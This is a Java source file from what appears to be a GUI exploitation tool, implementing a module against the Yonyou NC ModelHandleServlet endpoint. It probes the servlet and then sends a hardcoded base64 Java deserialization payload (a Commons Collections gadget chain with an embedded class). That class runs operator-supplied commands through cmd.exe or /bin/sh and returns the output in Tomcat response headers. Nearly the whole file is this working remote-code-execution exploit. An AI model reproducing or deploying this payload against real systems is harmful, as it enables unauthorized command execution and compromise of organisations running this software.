package exp.oa.yongyou.ncinterface;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Methods;
import utils.Response;

import java.util.HashMap;

public class yongyou_nc_ModelHandleServlet_serial implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        Platform.runLater(() -> {
            textArea.appendText("\n 该漏洞已直接执行系统命令，无需getshell");
        });
        return false;
    }
    @Override
    public Boolean checkVulCmd(String url,String cmd ,TextArea textArea, TextArea textArea_cmd) {
        return attcmd(url,cmd, textArea,textArea_cmd);
//        return null;
    }

    private Boolean att(String url, TextArea textArea) {
        try {
            HashMap<String, String> head = new HashMap<>();
            Response post_res = HttpTools.get(url + "/servlet/~ic/uap.pub.ae.model.handle.ModelHandleServlet" , head, "utf-8");
            if (post_res.getCode() != 404 && post_res.getCode() != 0) {
                Platform.runLater(() -> {
//                    textArea.appendText("\n 漏洞存在 输入cmd开始构造回显");
                    textArea.appendText("\n [ yongyou_nc_ModelHandleServlet_serial ]");
                    textArea.appendText("\n 接口存在，尝试TomcatEcho构造回显");
                    textArea.appendText("\n");
                });


                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n");
                });
                return false;
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
//                textArea.appendText("\n yongyou_nc_ModelHandleServlet_serial-漏洞不存在");
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }
    private Boolean attcmd(String url, String cmd, TextArea textArea,TextArea textArea_cmd) {

        String s = "rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAAB3NyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyACpvcmcubW96aWxsYS5qYXZhc2NyaXB0LkRlZmluaW5nQ2xhc3NMb2FkZXIAAAAAAAAAAAAAAHhwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5JbnZva2VyVHJhbnNmb3JtZXKH6P9re3zOOAIAA1sABWlBcmdzdAATW0xqYXZhL2xhbmcvT2JqZWN0O0wAC2lNZXRob2ROYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7WwALaVBhcmFtVHlwZXN0ABJbTGphdmEvbGFuZy9DbGFzczt4cHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAF1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0ABZnZXREZWNsYXJlZENvbnN0cnVjdG9ydXEAfgAaAAAAAXZxAH4AGnNxAH4AE3VxAH4AGAAAAAF1cQB+ABgAAAAAdAALbmV3SW5zdGFuY2V1cQB+ABoAAAABdnEAfgAYc3EAfgATdXEAfgAYAAAAAnQACEl5cm1DbUpWdXIAAltCrPMX+AYIVOACAAB4cAAADp7K/rq+AAAAMwDxCgAbAGQKAGUAZgoAZQBnCABoCgBMAGkHAGoKAGUAawgAbAoAIQBtCABuCABvBwBwCABxCAByCABzBwB0CAB1BwB2CwASAHcLABIAeAgAeQoAGwB6CAB7BwB8CQAcAH0KABgAfgcAfwcAgAoAHACBCgCCAIMIAIQIAIUHAIYIAIcKACEAiAgAiQoAIQCKCACLCACMCACNCgAhAI4IAI8KAJAAkQgAkgoAIQCTCACUCACVCACWCACXBwCYCgAyAGQHAJkKADQAmgoANACbCgCcAJ0HAJ4HAJ8IAKAKADkAoQoAOACiCgA4AKMKADIApAoAMgClBwCmCgBAAGQKADIApwkAqACpCgAhAKoKAEAAqwoAGACsBwCtCgAYAK4KAEcAiAoArwCwCgCvALEHALIBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQANU3RhY2tNYXBUYWJsZQcAsgcAhgcAswcAfwcAdAcAdgcAtAcAmAcAtQcAngEABWdldEZWAQA4KExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09iamVjdDsHALYHAHwHAK0BAApFeGNlcHRpb25zAQAKU291cmNlRmlsZQEADUl5cm1DbUpWLmphdmEMAE0ATgcAswwAtwC4DAC5ALoBAAd0aHJlYWRzDABcAF0BABNbTGphdmEvbGFuZy9UaHJlYWQ7DAC7ALwBAARleGVjDAC9AL4BAARodHRwAQAGdGFyZ2V0AQASamF2YS9sYW5nL1J1bm5hYmxlAQAGdGhpcyQwAQAHaGFuZGxlcgEABmdsb2JhbAEAE2phdmEvbGFuZy9FeGNlcHRpb24BAApwcm9jZXNzb3JzAQAOamF2YS91dGlsL0xpc3QMAL8AwAwAwQDCAQADcmVxDADDAMQBAAdnZXROb3RlAQAPamF2YS9sYW5nL0NsYXNzDADFAMYMAMcAyAEAEGphdmEvbGFuZy9PYmplY3QBABFqYXZhL2xhbmcvSW50ZWdlcgwATQDJBwDKDADLAMwBAAtnZXRSZXNwb25zZQEACWdldEhlYWRlcgEAEGphdmEvbGFuZy9TdHJpbmcBAAhUZXN0ZWNobwwATQDNAQAHVGVzdGRtYwwAzgDPAQAJYWRkSGVhZGVyAQAIVGVzdEVjaG8BAAEgDADQANEBAAdvcy5uYW1lBwDSDADTANQBAAdXaW5kb3dzDADVANYBAB5DOlxcd2luZG93c1xcc3lzdGVtMzJcXGNtZC5leGUBAAIvYwEABy9iaW4vc2gBAAItYwEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyAQAYamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyDABNANcMANgA2QcA2gwA2wDcAQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgEAGWphdmEvaW8vSW5wdXRTdHJlYW1SZWFkZXIBAAVVVEYtOAwATQDdDABNAN4MAN8AvAwA4ADhDADgAOIBABZzdW4vbWlzYy9CQVNFNjRFbmNvZGVyDADjALwHAOQMAOUA5gwA5wDoDADpAOoMAOsA7AEAHmphdmEvbGFuZy9Ob1N1Y2hGaWVsZEV4Y2VwdGlvbgwA7QDEBwC2DADuAO8MAMEA8AEACEl5cm1DbUpWAQAQamF2YS9sYW5nL1RocmVhZAEAE1tMamF2YS9sYW5nL1N0cmluZzsBABNqYXZhL2lvL0lucHV0U3RyZWFtAQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQBAA1jdXJyZW50VGhyZWFkAQAUKClMamF2YS9sYW5nL1RocmVhZDsBAA5nZXRUaHJlYWRHcm91cAEAGSgpTGphdmEvbGFuZy9UaHJlYWRHcm91cDsBAAdnZXROYW1lAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEABHNpemUBAAMoKUkBAANnZXQBABUoSSlMamF2YS9sYW5nL09iamVjdDsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAARUWVBFAQARTGphdmEvbGFuZy9DbGFzczsBAAlnZXRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAEKEkpVgEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAB2lzRW1wdHkBAAMoKVoBAAVzcGxpdAEAJyhMamF2YS9sYW5nL1N0cmluZzspW0xqYXZhL2xhbmcvU3RyaW5nOwEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAKc3RhcnRzV2l0aAEAFShMamF2YS9sYW5nL1N0cmluZzspWgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAKihMamF2YS9pby9JbnB1dFN0cmVhbTtMamF2YS9sYW5nL1N0cmluZzspVgEAEyhMamF2YS9pby9SZWFkZXI7KVYBAAhyZWFkTGluZQEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEAHChDKUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEAIWphdmEvbmlvL2NoYXJzZXQvU3RhbmRhcmRDaGFyc2V0cwEABVVURl84AQAaTGphdmEvbmlvL2NoYXJzZXQvQ2hhcnNldDsBAAhnZXRCeXRlcwEAHihMamF2YS9uaW8vY2hhcnNldC9DaGFyc2V0OylbQgEABmVuY29kZQEAFihbQilMamF2YS9sYW5nL1N0cmluZzsBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQANZ2V0U3VwZXJjbGFzcwEADXNldEFjY2Vzc2libGUBAAQoWilWAQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsAIQBMABsAAAAAAAIAAQBNAE4AAQBPAAADuwAIABYAAALCKrcAAQFMAU0DPiq4AAK2AAMSBLcABcAABsAABsAABjoEAzYFFQUZBL6iApQZBBUFMjoGGQbGAoIZBrYABzoHGQcSCLYACZoCcRkHEgq2AAmZAmcqGQYSC7cABToIGQjBAAyZAlUqKioZCBINtwAFEg63AAUSD7cABToIpwAIOgmnAjcqGQgSEbcABcAAEjoJAzYKFQoZCbkAEwEAogIUGQkVCrkAFAIAOgsqGQsSFbcABToIGQi2ABYSFwS9ABhZA7IAGVO2ABoZCAS9ABtZA7sAHFkEtwAdU7YAHjoMGQy2ABYSHwO9ABi2ABoZDAO9ABu2AB46DRkMtgAWEiAEvQAYWQMTACFTtgAaGQwEvQAbWQO7ACFZEiK3ACNTtgAewAAhTRkMtgAWEiAEvQAYWQMTACFTtgAaGQwEvQAbWQO7ACFZEiS3ACNTtgAewAAhTCzGAAostgAlmQAOK8YBRiu2ACWaAT8EPiy2ACWaAD8ZDbYAFhImBb0AGFkDEwAhU1kEEwAhU7YAGhkNBb0AG1kDuwAhWRIntwAjU1kEuwAhWRIntwAjU7YAHlcrtgAlmgDzKxIotgApOg4ZDr4FYL0AIToPEiq4ACs6EBkQEiy2AC2ZABIZDwMSLlMZDwQSL1OnAA8ZDwMSMFMZDwQSMVMDNhEVERkOvqIAFRkPFREFYBkOFREyU4QRAaf/6bsAMlm3ADM6EbsANFkZD7cANbYANrYANzoSuwA4WbsAOVkZEhI6twA7twA8OhMZE7YAPVk6FMYAExkRGRS2AD4QCrYAP1en/+i7AEBZtwBBGRG2AEKyAEO2AES2AEU6FRkNtgAWEiYFvQAYWQMTACFTWQQTACFTtgAaGQ0FvQAbWQO7ACFZEiS3ACNTWQQZFVO2AB5XHZkABqcACYQKAaf95h2ZAAanAAmEBQGn/WqnAARMsQACAGUAewB+ABAABAK9AsAAEAACAFAAAAAGAAEAAAABAFEAAADLABT/ACQABgcAUgcAUwcAUwEHAAYBAAD/AFkACQcAUgcAUwcAUwEHAAYBBwBUBwBTBwBVAAEHAFYE/QAPBwBXAf4AyAcAVQcAVQcAVQr7AET+ADgHAFgHAFgHAFML/AACAfoAGf4ALQcAWQcAWgcAW/wAGgcAU/8ASwAOBwBSBwBTBwBTAQcABgEHAFQHAFMHAFUHAFcBBwBVBwBVBwBVAAD4AAb6AAX/AAYABgcAUgcAUwcAUwEHAAYBAAD/AAUAAQcAUgAAQgcAVgAAAgBcAF0AAgBPAAAAdQADAAYAAAA+AU4rtgAWOgQZBBMAG6UAGRkELLYARk6nAA86BRkEtgBIOgSn/+UtxwAMuwBHWSy3AEm/LQS2AEotK7YAS7AAAQAQABcAGgBHAAIAUAAAAAYAAQAAAAEAUQAAABEABP0ACAcAXgcAX1EHAGALDABhAAAABAABABAAAQBiAAAAAgBjdAALZGVmaW5lQ2xhc3N1cQB+ABoAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAoc3EAfgATdXEAfgAYAAAAAXVxAH4AGgAAAABxAH4AHHVxAH4AGgAAAAFxAH4AHnNxAH4AE3VxAH4AGAAAAAF1cQB+ABgAAAAAcQB+ACJ1cQB+ABoAAAABcQB+ACRzcQB+AA9zcQB+AAB3DAAAABA/QAAAAAAAAHhzcgARamF2YS51dGlsLkhhc2hNYXAFB9rBwxZg0QMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAAdwgAAAAQAAAAAHh4eA==";
        try {
            String cmd_echo = Methods.Tomcatecho(url + "/servlet/~ic/uap.pub.ae.model.handle.ModelHandleServlet",cmd,s);

            if (cmd_echo != null) {
                Platform.runLater(() -> {
                    textArea.appendText("\n "+ cmd +" 执行成功！");
                    textArea_cmd.appendText("\n"+cmd_echo);
                });
                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n "+ cmd +" 执行失败！");
                });
                return false;
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
//                textArea.appendText("\n yongyou_nc_ModelHandleServlet_serial-漏洞不存在");
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }
}
